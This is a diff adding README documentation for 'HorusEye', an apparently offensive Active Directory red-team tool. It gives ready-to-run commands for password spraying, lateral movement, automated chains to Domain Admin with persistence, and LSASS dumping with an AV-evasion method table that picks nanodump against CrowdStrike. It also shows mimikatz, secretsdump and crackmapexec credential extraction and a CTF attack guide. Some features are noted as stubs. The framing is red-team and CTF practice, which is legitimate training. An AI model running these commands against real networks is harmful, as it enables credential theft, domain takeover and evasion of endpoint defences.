+| `first.last` | `john.smith` |
+| `flast` | `jsmith` |
+| `f.last` | `j.smith` |
+| `lastf` | `smithj` |
+| `first_last` | `john_smith` |
+| `adm_flast` | `adm_jsmith` |
+| `svc_flast` | `svc_jsmith` |
+| `firstlast` | `johnsmith` |
+| `FLAST` | `JSMITH` |
+| `First.Last` | `John.Smith` |
+| + 8 more... | |
+
+```bash
+# From BloodHound users (most accurate)
+python3 horuseye.py --bloodhound ./bh/ --domain corp.local --make-wordlist --output users.txt
+
+# From a names file
+python3 horuseye.py --make-wordlist --users-file names.txt --output wordlist.txt
+
+# Single name
+python3 horuseye.py --make-wordlist --firstname John --lastname Smith --output john.txt
+```
+
+### Password Spraying
+
+Multi-threaded password sprayer with lockout protection. Supports SMB (primary) and LDAP (fallback) authentication.
+
+```bash
+# Basic spray
+python3 horuseye.py --spray --users-file users.txt --password 'Password123' \
+    --domain corp.local --dc 10.10.10.5
+
+# Safe mode: stops automatically if lockout detected
+python3 horuseye.py --spray --users-file users.txt --password 'Summer2024!' \
+    --domain corp.local --dc 10.10.10.5 --safe --delay 2.0 --jitter 0.5
+
+# Multiple passwords from file
+python3 horuseye.py --spray --users-file users.txt --passwords-file passes.txt \
+    --domain corp.local --dc 10.10.10.5 --safe --threads 3
+```
+
+**Options:**
+
+| Flag | Default | Description |
+|---|---|---|
+| `--safe` | off | Auto-stop on first lockout detected |
+| `--delay` | 1.0s | Delay between each attempt |
+| `--jitter` | 0.5s | Random jitter added to delay |
+| `--threads` | 5 | Concurrent threads |
+
+Valid credentials are saved to `valid_credentials.txt` immediately on discovery.
+
+### Lateral Movement Engine
+
+![Lateral Movement](docs/imgs/05_lateral.png)
+
+After obtaining credentials, maps every reachable host on the network. Multi-threaded port scan → credential test → admin detection → share enumeration.
+
+```bash
+python3 horuseye.py --pivot \
+    --target-network 10.10.10.0/24 \
+    -u svc-sql -p '<password>' \
+    --domain corp.local --dc 10.10.10.5
+```
+
+**What it does:**
+1. Port scans the target range for SMB (445), WinRM (5985), RDP (3389), LDAP (389), MSSQL (1433)
+2. Tests credentials on every live SMB host
+3. Probes `ADMIN$` share to confirm local admin rights
+4. Enumerates accessible shares (flags SYSVOL, C$, backup, data)
+5. Saves all admin hosts to `valid_credentials.txt` with format `ADMIN:IP:hostname:domain\user`
+
+Outputs a table of reachable hosts with protocol icons, admin status, and next-step commands for each admin host.
+
+### Attack Timeline
+
+![Timeline](docs/imgs/04_timeline.png)
+
+Builds a visual ASCII timeline from your current position to Domain Admin, with time estimates for each step.
+
+```bash
+python3 horuseye.py --bloodhound ./bh/ --domain corp.local --timeline
+```
+
+Phases: `FOOTHOLD` → `ESCALATION` → `LATERAL` → `DA` → `PERSIST`
+
+Each step shows:
+- Estimated elapsed time (T+Xm)
+- Exact command to run
+- AI narrative explaining the step
+- Time estimate to crack (for Kerberoast/AS-REP)
+
+Export to plain text for reports:
+```bash
+python3 -c "
+from attack_timeline import AttackTimeline
+tl = AttackTimeline()
+tl.build_from_findings(findings, 'corp.local')
+tl.export_timeline_txt('timeline.txt', 'corp.local')
+"
+```
+
+### Auto-Exploit Chain
+
+> **Status:** these flags are **stubs** — they print the chain/method and the
+> commands to run rather than executing against a DC. Live execution is on the
+> [Roadmap](#roadmap). The sections below describe the intended workflow.
+
+Automated end-to-end exploitation without manual steps.
+
+```bash
+# Kerberoast → crack → validate → pivot
+python3 horuseye.py --bloodhound ./bh/ --domain corp.local --dc 10.10.10.5 --auto-chain
+
+# Full path to DA
+python3 horuseye.py --bloodhound ./bh/ --domain corp.local --dc 10.10.10.5 --auto-exploit
+
+# After DA: suggest and execute persistence
+python3 horuseye.py --bloodhound ./bh/ --domain corp.local --dc 10.10.10.5 \
+    --auto-exploit --auto-persist
+
+# Interactive: AI asks before every action
+python3 horuseye.py --bloodhound ./bh/ --domain corp.local --dc 10.10.10.5 --interactive
+```
+
+In `--interactive` mode, HorusEye acts as a senior red team operator. It presents ranked options at each decision point and waits for your confirmation before executing.
+
+### LSASS Dump Automation
+
+> **Status:** stub — prints the recommended dump method and commands rather
+> than executing them. See the [Roadmap](#roadmap).
+
+Selects an LSASS dump method based on the environment and prints the exact commands to run.
+
+```bash
+python3 horuseye.py --lsass-dump 10.10.10.10 \
+    -u svc-sql -p '<password>' --domain corp.local
+```
+
+**Method selection logic:**
+
+| Detected AV | Selected Method | Stealth Score |
+|---|---|---|
+| CrowdStrike / SentinelOne | nanodump | 10/10 |
+| Windows Defender | comsvcs (rundll32) | 8/10 |
+| None detected | comsvcs (rundll32) | 8/10 |
+| Fallback | procdump | 5/10 |
+
+After dumping, extract with:
+```bash
+pypykatz lsa minidump lsass.dmp
+# or
+mimikatz # sekurlsa::minidump lsass.dmp
+mimikatz # sekurlsa::logonpasswords full
+```
+
+### Domain Takeover Checklist
+
+![Checklist](docs/imgs/07_checklist.png)
+
+20-item checklist covering every phase of a domain takeover. Items auto-tick from the live detection results of the current run (✅ when a matching finding was produced, ⬜ for manual steps not yet observed).
+
+```bash
+python3 horuseye.py --bloodhound ./bh/ --domain corp.local --da-checklist
+```
+
+Categories: FOOTHOLD → RECON → CRED → LATERAL → ESCALATION → DA → PERSIST → REPORT
+
+Items marked `(auto)` are checked automatically when HorusEye detects or completes that step. Manual items require your confirmation.
+
+### Team Collaboration
+
+![Team Collaboration](docs/imgs/06_team_collab.png)
+
+Real-time shared session over TCP port 31337. One operator hosts, others connect. All findings, cracked hashes, and credentials are broadcast to every connected operator instantly.
+
+```bash
+# Operator 1: start the server
+python3 horuseye.py --team-server --team-port 31337
+
+# Operator 2: join and run analysis simultaneously
+python3 horuseye.py --team-connect 10.10.10.1:31337 \
+    --bloodhound ./bh/ --domain corp.local --dc 10.10.10.5
+
+# With password protection
+python3 horuseye.py --team-server --team-port 31337
+# set password in config, others pass it with --team-connect
+```
+
+What gets shared in real-time:
+- New attack path findings
+- Valid credentials discovered
+- Cracked hashes
+- Checklist item updates
+- Chat messages between operators
+
+Operators joining late receive a full state sync of everything found so far.
+
+### Credentials Manager
+
+![Credentials](docs/imgs/08_creds.png)
+
+Every credential found by any module (spray, kerberoast, AS-REP, crack, lateral movement, DCSync) is funnelled through a central manager with automatic deduplication.
+
+**Output files:**
+
+`valid_credentials.txt` — Human-readable, one credential per line:
+```
+corp.local\svc-sql:<password>  # kerberoast [2025-01-15 14:32:11]
+corp.local\jsmith:<password>         # spray [2025-01-15 14:45:03]
+corp.local\Administrator:<NTLM>      # dcsync [DA] [2025-01-15 15:01:44]
+```
+
+`valid_credentials.json` — Structured JSON for pipeline integration:
+```json
+{
+  "credentials": [
+    {
+      "domain": "corp.local",
+      "username": "svc-sql",
+      "password": "<password>",
+      "source": "kerberoast",
+      "is_da": false,
+      "is_admin": true
+    }
+  ]
+}
+```
+
+```bash
+# Quick use with impacket after HorusEye run
+secretsdump.py corp.local/svc-sql:'<password>'@10.10.10.5
+crackmapexec smb 10.10.10.0/24 -u svc-sql -p '<password>'
+```
+
+### CTF Usage Guide
+
+For CTF players: run SharpHound, feed the output to HorusEye, and within seconds you have a ranked list of attack paths from your current user to Domain Admin, with the command to validate each step.
+
+**HackTheBox Pro Labs / Active Directory machines**
+
+```bash
+# Step 1: Collect with SharpHound (run on Windows target)
+SharpHound.exe -c All --zipfilename bh.zip
+# Transfer to Kali and extract
+
+# Step 2: ADCS enumeration (if CA present)
+certipy find -u user@corp.local -p pass -dc-ip DC_IP -json
+
+# Step 3: Run HorusEye
+python3 horuseye.py \
+    --bloodhound ./bh/ \
+    --certipy certipy.json \
+    --domain corp.local \
+    --dc DC_IP \
+    --timeline \
+    --da-checklist \
+    --report report.html
+
+# Step 4: If Kerberoastable accounts found (stub: prints the chain to run)
+python3 horuseye.py --auto-chain --domain corp.local --dc DC_IP \
+    -u user -p pass
+
+# Step 5: After creds, lateral movement
+python3 horuseye.py --pivot --target-network 10.10.10.0/24 \
+    -u svc-sql -p '<password>' --domain corp.local --dc DC_IP
+```
+
+**Common CTF scenarios HorusEye detects:**
+
+- `ADCS ESC1` — Template allows SAN → request cert as DA → PKINIT → NTLM hash
+- `Kerberoast → crack → ACL chain` — Service account with WriteDacl on Domain Admins
+- `AS-REP Roast` — No credentials needed for initial foothold
+- `Unconstrained delegation` — Trigger printerbug → capture DA TGT
+- `Password spray → DA session on workstation` — Lateral to DA workstation → dump LSASS
 
 ---
 
